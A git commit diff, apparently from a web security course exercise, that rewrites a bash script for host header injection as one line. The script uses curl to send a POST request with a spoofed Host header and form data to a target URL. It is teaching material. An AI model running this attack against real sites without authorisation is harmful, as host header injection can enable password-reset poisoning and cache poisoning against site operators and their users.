82d0e0dd7bbbb729c3e47c83da5f6d0d7b3dc534
nicolas <nicolas@kali>
2024-08-26 15:27:09 +0200

    all in 2 lines

--- web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
+++ web_application_security/0x00_web_fundamentals/1-host_header_injection.sh
@@ -1,8 +1,2 @@
 #!/bin/bash
-NEW_HOST="$1"
-TARGET_URL="$2"
-FORM_DATA="$3"
-
-curl -X POST "$TARGET_URL" \
-	-H "Host: $NEW_HOST" \
-	-d "$FORM_DATA"
+NEW_HOST="$1"; TARGET_URL="$2"; FORM_DATA="$3"; curl -X POST "$TARGET_URL" -H "Host: $NEW_HOST" -d "$FORM_DATA"
